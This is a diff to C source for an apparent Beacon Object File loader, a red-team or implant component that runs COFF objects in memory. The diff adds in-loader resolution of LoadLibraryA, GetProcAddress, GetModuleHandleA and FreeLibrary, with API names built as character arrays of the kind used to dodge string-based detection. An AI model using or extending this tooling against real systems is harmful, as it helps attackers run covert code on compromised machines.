@@ -54,9 +54,14 @@ PBYTE GetExternalFunctionAddress(LPCSTR symbolName, char** internalFunctionAddre
     for(int i=0;i<512;i++){
       localSymbolNameCopy[i] = '\0';
     }
+
     CHAR prefixSymbolString[] = { '_','_','i','m','p','_',0x00 };
     CHAR prefixBeaconString[] = { '_','_','i','m','p','_','B','e','a','c','o','n',0x00 };
     CHAR prefixToWideCharString[] = { '_','_','i','m','p','_','t','o','W','i','d','e','C','h','a','r',0x00 };
+    CHAR prefixLoadLibraryAString[] = { '_','_','i','m','p','_', 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A',0x00 };
+    CHAR prefixGetProcAddressString[] = { '_','_','i','m','p','_', 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's' , 's', 0x00 };
+    CHAR prefixGetModuleHandleAString[] = { '_','_','i','m','p','_', 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd' , 'l', 'e', 'A', 0x00 };
+    CHAR prefixFreeLibraryString[] = { '_','_','i','m','p','_', 'F', 'r', 'e', 'e', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 0x00 };
     PCHAR therest = NULL;
     PBYTE returnAddress = NULL;
     LPCSTR symbolWithoutPrefix = (LPCSTR)(((PBYTE)symbolName) + 6);
@@ -83,16 +88,21 @@ PBYTE GetExternalFunctionAddress(LPCSTR symbolName, char** internalFunctionAddre
     CHAR strlenString[] = { 's', 't', 'r', 'l', 'e', 'n', 0 };
     strlenFunc = GetSymbolAddress(msvcrtDLL, strlenString);
 
-    if (((STRNCMP)strncmpFunc)(prefixSymbolString, symbolName, 6)) {
+    // If the symbol doesn't start with "__imp_", return NULL
+    if (((STRNCMP)strncmpFunc)(prefixSymbolString, symbolName, 6)) { 
         return returnAddress;
     }
     // Check is it our cs function implmenetation
-    if (((STRNCMP)strncmpFunc)(prefixBeaconString, symbolName, 12) == 0 || ((STRNCMP)strncmpFunc)(prefixToWideCharString, symbolName, 16) == 0) {
-        for (int i = 0; i < 23; i++) {
+    if (((STRNCMP)strncmpFunc)(prefixBeaconString, symbolName, 12) == 0             ||
+        ((STRNCMP)strncmpFunc)(prefixToWideCharString, symbolName, 16) == 0         ||
+        ((STRNCMP)strncmpFunc)(prefixLoadLibraryAString, symbolName, 18) == 0       ||
+        ((STRNCMP)strncmpFunc)(prefixGetProcAddressString, symbolName, 20) == 0     ||
+        ((STRNCMP)strncmpFunc)(prefixGetModuleHandleAString, symbolName, 22) == 0   ||
+        ((STRNCMP)strncmpFunc)(prefixFreeLibraryString, symbolName, 17) == 0         ) { 
+        for (int i = 0; i < 27; i++) {
             if (((STRNCMP)strncmpFunc)(symbolWithoutPrefix, (LPCSTR) internalFunctionStrings[i],((STRLEN)strlenFunc)(symbolWithoutPrefix)) == 0) {
                 return (PBYTE) internalFunctionAddresses[i];
             }
-
         }
     }
     else {
@@ -130,9 +140,9 @@ void RunCOFF(PBYTE fileBuffer, PCHAR argumentBuffer, UINT32 argumentLength) {
     UINT64 kernel32DLL, msvcrtDLL;
     UINT64 loadLibraryAFunc, virtualAllocFunc, strncmpFunc, strlenFunc, printfFunc;
     PBYTE allocatedMemory = NULL;
-	  PFILE_HEADER imageFileHeader = (PFILE_HEADER)fileBuffer;
-	  int totalSize = 0;
-	  PSECTION_HEADER sectionHeaderArray = (PSECTION_HEADER)(fileBuffer + sizeof(IMAGE_FILE_HEADER) + imageFileHeader->SizeOfOptionalHeader);
+    PFILE_HEADER imageFileHeader = (PFILE_HEADER)fileBuffer;
+    int totalSize = 0;
+    PSECTION_HEADER sectionHeaderArray = (PSECTION_HEADER)(fileBuffer + sizeof(IMAGE_FILE_HEADER) + imageFileHeader->SizeOfOptionalHeader);
     PSECTION_HEADER sectionHeaderCursor = sectionHeaderArray;
     PSECTION_HEADER textSectionHeader = NULL;
     PSECTION_INFO sectionInfoList = NULL;
@@ -180,6 +190,10 @@ void RunCOFF(PBYTE fileBuffer, PCHAR argumentBuffer, UINT32 argumentLength) {
     CHAR beaconInjectTemporaryProcessAsString[] = { 'B','e','a','a','c','o','n','I','n','j','e','c','t','T','e','m','p','o','r','a','r','y','P','r','o','c','e','s','s',0x00};
     CHAR beaconCleanupProcessAsString[] = { 'B','e','a','c','o','n','C','l','e','a','n','u','p','P','r','o','c','e','s','s',0x00 };
     CHAR toWideCharAsString[] = { 't','o','W','i','d','e','C','h','a','r',0x00 };
+    CHAR loadLibraryAString[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A',0x00 };
+    CHAR getProcAddressString[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's' , 's',0x00 };
+    CHAR getModuleHandleAString[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd' , 'l', 'e', 'A',0x00};
+    CHAR freeLibraryString[] = { 'F', 'r', 'e', 'e', 'L', 'i', 'b', 'r', 'a', 'r', 'y',0x00 };    
 
     /* Data Parsing */
     char* InternalFunctionStrings[] = {
@@ -206,9 +220,13 @@ void RunCOFF(PBYTE fileBuffer, PCHAR argumentBuffer, UINT32 argumentLength) {
         beaconInjectTemporaryProcessAsString,
         beaconCleanupProcessAsString,
         toWideCharAsString,
+        loadLibraryAString,
+        getProcAddressString,
+        getModuleHandleAString,
+        freeLibraryString
     };
 
-    char* InternalFunctionAddresses[23] = { 0x00};
+    char* InternalFunctionAddresses[27] = { 0x00};
 
     SetInternalFunctions(InternalFunctionAddresses);
 
@@ -216,7 +234,6 @@ void RunCOFF(PBYTE fileBuffer, PCHAR argumentBuffer, UINT32 argumentLength) {
         return;
     }
 
-    CHAR loadLibraryAString[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0 };
     loadLibraryAFunc = GetSymbolAddress(kernel32DLL, loadLibraryAString);
 
     CHAR msvcrtString[] = { 'm', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0 };
